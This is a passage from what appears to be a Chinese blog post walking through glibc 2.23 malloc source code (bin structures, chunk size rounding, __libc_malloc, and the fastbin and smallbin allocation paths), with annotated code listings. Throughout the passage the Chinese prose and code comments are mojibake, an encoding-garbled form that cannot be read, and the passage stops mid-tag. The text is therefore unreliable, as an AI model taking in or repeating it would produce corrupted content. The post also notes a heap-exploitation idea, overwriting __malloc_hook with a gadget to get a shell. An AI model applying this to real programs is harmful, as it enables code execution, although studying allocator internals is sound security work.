çš„è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯<strong>å…ˆè¿›å…ˆå‡º</strong>ï¼Œæ‰€ä»¥åŒä¸€ä¸ªé“¾è¡¨ä¸­å…ˆè¢«é‡Šæ”¾çš„ chunk ä¼šå…ˆè¢«åˆ†é…å‡ºå»ã€‚</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/smallbin.png"></p><h5 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h5><p><code>large bin</code> ä¸€å…±æœ‰ 63 ä¸ªï¼Œä» <code>small bin</code> æœ€å°ä¸èƒ½è¡¨ç¤ºçš„ chunk å¼€å§‹ï¼Œå¤§åˆ°æ— ç©·ã€‚</p><p> <code>large bin</code> ä» <code>128*SIZE_SZ</code> å¼€å§‹ã€‚é‚£ä¹ˆä¸‹æ ‡ä¸º<code>0</code>çš„<code>large bin</code>è¡¨ç¤ºçš„èŒƒå›´å°±æ˜¯<code>128*SIZE_SZ~144*SIZE_SZ</code>(å·¦é—­å³å¼€)ï¼ŒåŒç†ä¸‹æ ‡ä¸º1çš„<code>large bin</code>è¡¨ç¤ºçš„èŒƒå›´å°±æ˜¯<code>144*SIZE_SZ~160*SIZE_SZ</code>ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç­‰åˆ°<code>32</code>çš„æ—¶å€™å°±åœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ <code>32*SIZE_SZ</code>ä½œä¸ºå³å¼€åŒºé—´</p><p>å®ƒåŒæ ·ä»¥äºŒç»´åŒå‘é“¾è¡¨è¿›è¡Œç®¡ç†ï¼Œç›¸åŒå¤§å°çš„ chunk ç”¨ <code>fd</code> å’Œ <code>bk</code> æŒ‡é’ˆç›¸è¿ï¼›ä¸åŒå¤§å°çš„ chunkï¼Œç”¨ <code>fd_nextsize</code> å’Œ <code>bk_nextsize</code> æŒ‡é’ˆè¿æ¥ã€‚æ²¿ç€ <code>fd_nextsize</code> æŒ‡é’ˆï¼Œchunk å¤§å°é€’å¢ã€‚</p><p>å¤§æ¦‚ç»“æ„å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin.png"></p><p>ï¼ˆçœç•¥äº†éƒ¨åˆ†æŒ‡é’ˆï¼‰</p><h3 id="å…·ä½“åˆ†é…ç»†èŠ‚"><a href="#å…·ä½“åˆ†é…ç»†èŠ‚" class="headerlink" title="å…·ä½“åˆ†é…ç»†èŠ‚"></a>å…·ä½“åˆ†é…ç»†èŠ‚</h3><p><code>malloc()</code> ä¼šå¯¹ç”¨æˆ·è¯·æ±‚çš„sizeè¿›è¡Œå¤„ç†ï¼Œæ¥ç”³è¯·åŒæ—¶æ»¡è¶³ <code>SIZE_SZ*2</code> çš„æ•´æ•°å€ï¼ŒåŒ…å« 0x10 çš„å›ºå®šæ•°æ®åŒºåŸŸä¸”å¤§å°æœ€å°çš„å †å—ã€‚</p><p><img src="/img/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/%E5%88%86%E9%85%8D%E7%BB%86%E8%8A%82size%E5%A4%84%E7%90%86.png"></p><p>åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬ç”³è¯·å¤šå¤§çš„å †å—ï¼Œå°±æœ‰å¤šå°‘åŒºåŸŸæ¥ä¾›æˆ‘ä»¬å‘ä¸Šå†™æ•°æ®ã€‚</p><p>ä¸€ä¸ª <code>size=0x20</code> çš„ chunk ä¸­ï¼Œ0x20 å­—èŠ‚åˆ†åˆ«ä¸º <code>prev_size</code>ï¼Œ<code>size</code>ï¼Œ<code>fd</code> å’Œ <code>bk</code>ã€‚</p><p><code>prev_size</code> å’Œ <code>size</code> éƒ½ä¸å…è®¸å†™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å†™ <code>fd</code> å’Œ <code>bk</code> ï¼Œä»¥åŠä¸‹ä¸€ä¸ªå—çš„ <code>prev_size</code> ã€‚æ‰€ä»¥<code>size=0x20</code>ï¼Œæˆ‘ä»¬å¯ä»¥å†™çš„æ•°æ®æ®µä¸º <code>0x18</code> ã€‚</p><p>æ‰€ä»¥å½“æˆ‘è¯·æ±‚çš„å†…å­˜å°äºç­‰äº 0x18 çš„æ—¶å€™ï¼Œç³»ç»Ÿå°±ä¼šç»™æˆ‘ä»¬ <code>size=0x20</code> çš„ chunk ã€‚ä¸€æ—¦å¤šäº†å°±ä¼šä»¥ <code>0x10( 2*SIZE_SZ)</code>  ä¸ºå•ä½å‘ä¸ŠåŠ ç›´åˆ°æ»¡è¶³æ¡ä»¶ã€‚</p><p>è®¡ç®—å¥½å¤§å°ä¹‹åå°±è¿›å…¥åˆ†é…ç¯èŠ‚ï¼Œç³»ç»Ÿæœå¯»å †å—çš„é¡ºåºæ˜¯ï¼š <code>fast bin -&gt; small bin -&gt; large bin -&gt; unsorted bin</code></p><p> <code>fast bin</code> ã€<code>small bin</code> å’Œ<code>large bin</code> åœ¨æœå¯»é˜¶æ®µéƒ½ä¸è¿›è¡Œåˆå¹¶å’Œåˆ†å‰²å¤„ç†ã€‚å¦‚æœåœ¨å‰ä¸‰ä¸ªbinsä¸­éƒ½æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„å †å—ï¼Œ<code>unsorted bin</code> ä¼šæ‰¾ç¬¬ä¸€ä¸ªèƒ½æ»¡è¶³çš„ chunk å¹¶è¿”å›æˆ–è€…åˆ‡å‰²ä¹‹åè¿”å›ã€‚å¦‚æœåˆ‡å‰²ä¹‹åå‰©ä½™çš„éƒ¨åˆ†å°äº <code>MINSIZE</code> ï¼Œé‚£ä¹ˆåˆ™ä¸ä¼šåˆ‡å‰²æ•´ä¸ªè¿”å›ã€‚</p><p><code>unsorted bin</code> ä¸­æ¯éå†ä¸€ä¸ªä¸æ»¡è¶³è¦æ±‚çš„ free_chunk å°±ä¼šæŠŠè¿™ä¸ªå †å—æ”¾è¿›å¯¹åº”çš„ <code>small bin</code> æˆ–è€…<code>large bin</code>å½“ä¸­ã€‚</p><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><p>ä¸‹è½½æºç ï¼Œè¿˜æŒºæ…¢çš„å°±æ˜¯è¯´</p><p>æˆ‘çš„ç¯å¢ƒæ˜¯ ubuntu16.04</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install glibc-source <br>sudo apt-get install libc6-dbg <br>sudo tar xf /usr/src/glibc/glibc-2.23.tar.xz<br></code></pre></td></tr></table></figure><blockquote><p>ä¹‹å‰æˆ‘è¿˜åœ¨æƒ³ä¸ºå•¥ç½‘ä¸Šåˆ†ææºç çš„éƒ½æ˜¯ä¸€æ®µä¸€æ®µçš„ï¼Œæ²¡æƒ³åˆ°è¿™ä¸ª malloc å®ƒè¿™ä¹ˆå¤§ä¸ªæ–‡ä»¶å¤¹ğŸ˜¶â€ğŸŒ«ï¸</p></blockquote><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>åœ¨ glibc å†…éƒ¨ï¼Œ<code>malloc()</code> å‡½æ•°å°±æ˜¯ <code>__libc_malloc()</code> å‡½æ•°ï¼Œè€Œ <code>__libc_malloc()</code> å‡½æ•°çš„ä¸»è¦å·¥ä½œæ˜¯<code>_int_malloc()</code> å®Œæˆçš„ã€‚</p><h4 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h4><p>å¯¹åº”çš„åœ¨ä»£ç é‡ŒåŠ æ³¨é‡Šåˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br>  <br>  <span class="hljs-comment">//è¯»å–malloc_hookï¼Œè‹¥ malloc_hook è¢«è®¾ç½®ï¼Œåˆ™ç›´æ¥è°ƒç”¨</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><br>  <span class="hljs-comment">//è°ƒç”¨ arena_get å‡½æ•°ï¼Œå‡½æ•°è·å–ä¸€ä¸ªå¯ç”¨çš„åˆ†é…åŒº</span><br>  arena_get (ar_ptr, bytes);<br>    <br>  <span class="hljs-comment">//è¿™é‡Œï¼!è°ƒç”¨äº† _int_malloc()</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>    <br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-comment">//å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªé”™è¯¯æ£€éªŒï¼Ÿå¦‚æœ chunk ä¸ºç©ºï¼Œä½†åˆ†é…åŒºæŒ‡é’ˆä¸ä¸ºç©ºï¼Œå†æ¬¡è°ƒç”¨ _int_malloc è·å–</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>    <br>  <span class="hljs-comment">//ç»™å†…å­˜åˆ†é…åŒº è§£é”</span><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//å¯¹åˆ†é…çš„chunk æŒ‡é’ˆè¿›è¡Œåœ°å€æ£€æŸ¥</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>assert å‘½ä»¤å¦‚æœå¤±è´¥ï¼Œå³ä»£è¡¨å­˜åœ¨é”™è¯¯ï¼Œä¼šè§¦å‘å¯¹åº”çš„å¼‚å¸¸ï¼Œé€šå¸¸å¯¼è‡´ç¨‹åºç»ˆæ­¢å¹¶æ‰“å°å‡ºé”™è¯¯æ¶ˆæ¯ï¼Œä»¥å¸®åŠ©å®šä½å’Œä¿®å¤é—®é¢˜ã€‚</p></blockquote><p>æ ¹æ®å‡½æ•°å†…å®¹æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œåœ¨ malloc æ—¶ï¼Œä¼šå…ˆæ£€æŸ¥ <code>malloc_hook</code> æ‰€æŒ‡å‘çš„åŒºåŸŸã€‚</p><p>æˆ‘ä»¬å°±æœ‰ä¸€ä¸ªåˆ©ç”¨æ€è·¯æ˜¯ï¼Œ<strong>ä¿®æ”¹ <code>malloc_hook</code> ä¸ºæˆ‘ä»¬çš„ gadget ï¼Œä¿®æ”¹åå†æ¬¡è°ƒç”¨ malloc å°±ä¼šæ‰§è¡Œ gadget ä»è€Œ getshell ã€‚</strong></p><h4 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h4><p><code>__libc_malloc</code> æ˜¯é€šè¿‡è°ƒç”¨ <code>_int_malloc</code> æ¥æ‰§è¡Œåˆ†é…å †çš„æ“ä½œçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br><br>  checked_request2size (bytes, nb);<br><br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>  &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>  &#125;<br></code></pre></td></tr></table></figure><p>çœç•¥æ‰ä¸€å¼€å§‹å®šä¹‰çš„ä¸€å¤§å †å˜é‡ï¼Œmalloc çš„ç¬¬ä¸€æ­¥å°±æ˜¯è°ƒç”¨ <code>checked_request2size()</code> è®¾ç½® sizeã€‚</p><p> <code>checked_request2size()</code> å‡½æ•°å°±æ˜¯ç”¨æ¥æŸ¥æ‰¾æœ€å°çš„æ»¡è¶³æ¡ä»¶çš„ size æˆ‘å°±ä¸å¤åˆ¶äº†ğŸ¤ª</p><p>æ³¨æ„ä¸€ç³»åˆ—çš„å®å®šä¹‰ï¼š</p><ul><li><code>__glibc_unlikely(exp)</code> ï¼šè¡¨ç¤º exp å¾ˆå¯èƒ½ä¸ºå‡</li><li><code>__glibc_likely(exp)</code> ï¼šè¡¨ç¤º exp å¾ˆå¯èƒ½ä¸ºçœŸ</li><li><code>__builtin_expect(exp,value)</code> ï¼šè¡¨ç¤º exp&#x3D;&#x3D;value å¤§æ¦‚ç‡æˆç«‹</li></ul><p>æœ€åè¿™ä¸€å°èŠ‚çš„æ„æ€å°±æ˜¯å¦‚æœæ²¡æœ‰å¯ä»¥åˆ†é…çš„åŒºåŸŸï¼Œé‚£å°±è°ƒç”¨ <code>sys_malloc</code> ç³»ç»Ÿè°ƒç”¨å»ç”¨ mmap åˆ†é…æ–°çš„å †åŒºã€‚</p><h5 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h5><p>æ¥ä¸‹æ¥å‡½æ•°å°±è¿›å…¥ fastbin éƒ¨åˆ†å»æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„å †å—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//æ£€æŸ¥å †å—å¤§å°æ˜¯å¦å±äº fastbin</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      <span class="hljs-comment">// æ ¹æ® nb ä¹Ÿå°±æ˜¯å‰é¢è¿”å›çš„ size è·å– fastbins æ•°ç»„çš„ä¸‹æ ‡</span><br>      idx = fastbin_index (nb);<br>      <span class="hljs-comment">// å¾—åˆ°é“¾è¡¨å¤´æŒ‡é’ˆ</span><br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp = *fb;<br>      <span class="hljs-comment">// å¦‚æœå½“å‰é“¾è¡¨å­˜åœ¨ chunkï¼Œåˆ™åˆ†é…è¯¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ª chunk</span><br>      <span class="hljs-keyword">do</span><br>        &#123;<br>          victim = pp;<br>          <span class="hljs-comment">//å¦‚æœ victim==NULL ä¹Ÿå°±æ˜¯ fastbin é“¾è¡¨ä¸­æ²¡æœ‰ chunkï¼Œç›´æ¥ break è·³å‡º fastbin çš„æŸ¥æ‰¾</span><br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>      <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>             != victim);<br>      <span class="hljs-comment">// å¦‚æœbinä¸­æœ‰ chunkï¼Œæ£€æŸ¥æ‰€åˆ†é…çš„ chunk çš„ size ä¸æ‰€åœ¨é“¾è¡¨çš„ size æ˜¯å¦åŒ¹é…</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          check_remalloced_chunk (av, victim, nb);<br>          <span class="hljs-comment">//æ ¹æ® chunk å¾—åˆ°ç”¨æˆ·æ•°æ®æŒ‡é’ˆ p,å¹¶è¿”å›</span><br>          <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>          alloc_perturb (p, bytes);<br>          <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è¡¥å……ä¸€ä¸‹è¿™éƒ¨åˆ†ç”¨åˆ°çš„å®å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­æœ«å°¾æœ‰è°ƒç”¨åˆ° <code>check_remalloced_chunk</code> å‡½æ•°ï¼Œå‡½æ•°å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_remalloced_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br>&#123;<br>  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);<br><br>  <span class="hljs-comment">//æ£€æŸ¥åˆ†é…çš„å—æ˜¯å¦åœ¨å†…å­˜å † mmap åŒºåŸŸä¸­</span><br>  <span class="hljs-keyword">if</span> (!chunk_is_mmapped (p))<br>    &#123;<br>      assert (av == arena_for_chunk (p));<br>      <span class="hljs-keyword">if</span> (chunk_non_main_arena (p))<br>        assert (av != &amp;main_arena);<br>      <span class="hljs-keyword">else</span><br>        assert (av == &amp;main_arena);<br>    &#125;<br>  <span class="hljs-comment">//æ£€æŸ¥ prev_inuse é‚£ä¸‰ä¸ªæ ‡å¿—ä½</span><br>  do_check_inuse_chunk (av, p);<br><br>  <span class="hljs-comment">/* Legal size ... */</span><br>  <span class="hljs-comment">//æ£€æŸ¥åˆ†é…å—çš„å¤§å°æ˜¯å¦å¤§äºæœ€å°çš„æœ‰æ•ˆå¤§å°ï¼ˆMINSIZEï¼‰ </span><br>  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE);<br>  <span class="hljs-comment">/* ... and alignment */</span><br>  assert (aligned_OK (chunk2mem (p)));<br>  <span class="hljs-comment">/* chunk is less than MINSIZE more than request */</span><br>  <span class="hljs-comment">//ç¡®ä¿åˆ†é…çš„å—å¤§å°æ˜¯å¦æ˜¯æ»¡è¶³ç”³è¯·çš„ size æ¡ä»¶çš„æœ€å° size </span><br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s) &gt;= <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s + MINSIZE) &lt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å°±æ˜¯åœ¨æ£€æŸ¥åˆ†é…çš„ chunk çš„å„ä¸ªæ ‡å¿—ä½åŒé‡ä¿é™©ç¡®ä¿åˆ†é…çš„ chunk æ˜¯æ­£ç¡®çš„ã€‚</p><h5 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h5><p>å¦‚æœåœ¨ fastbin ä¸­æ‰¾ä¸åˆ°å°±ä¼šè¿›å…¥åˆ° smallbin </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      <span class="hljs-comment">//æŸ¥æ‰¾å¯¹åº”å¤§å°çš„ bin ä¸‹æ ‡</span><br>      idx = smallbin_index (nb);<br>      <span class="hljs-comment">// å¾—åˆ° small bin çš„é“¾è¡¨å¤´åœ°å€</span><br>      bin = bin_at (av, idx);<br>      <span class="hljs-comment">//// è¿™é‡Œä¼šè·å– small bin çš„æœ€åä¸€ä¸ª chunkï¼Œå¦‚æœ victim = binï¼Œè¯´æ˜ small bin æ˜¯ç©ºçš„</span><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-comment">// è·å– small bin çš„å€’æ•°ç¬¬äºŒä¸ª chunkï¼Œå› ä¸ºåŒå‘é“¾è¡¨æ‰€ä»¥å…¶å®å°±æ˜¯å€’æ•°ç¬¬ä¸€ä¸ª chunk</span><br>              bck = victim-&gt;bk;<br>                <span class="hljs-comment">// æ£€æŸ¥å€’æ•°ç¬¬äºŒä¸ª chunk çš„ fd æŒ‡é’ˆæ˜¯å¦æŒ‡å‘æœ€åä¸€ä¸ª chunk</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              <span class="hljs-comment">// è®¾ç½® victim çš„ä¸‹ä¸€ä¸ª chunk çš„ inuse ä½</span><br>              set_inuse_bit_at_offset (victim, nb);<br>              <span class="hljs-comment">// å°†æœ€åä¸€ä¸ª chunk ä» smallbin ä¸­å–å‡ºï¼Œé‡æ–°è®¾ç½®é“¾ä¸­çš„æŒ‡é’ˆ</span><br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>              <span class="hljs-comment">//å¦‚æœä¸æ˜¯ä¸»çº¿ç¨‹åˆ™è¦è®¾ç½® A æ ‡å¿—ä½</span><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              <span class="hljs-comment">//æ£€æŸ¥æ£€æŸ¥ï¼</span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-comment">//æ ¹æ® chunk å¾—åˆ°ç”¨æˆ·æ•°æ®æŒ‡é’ˆ p,å¹¶è¿”å›</span><br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å®å®šä¹‰ä»¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span 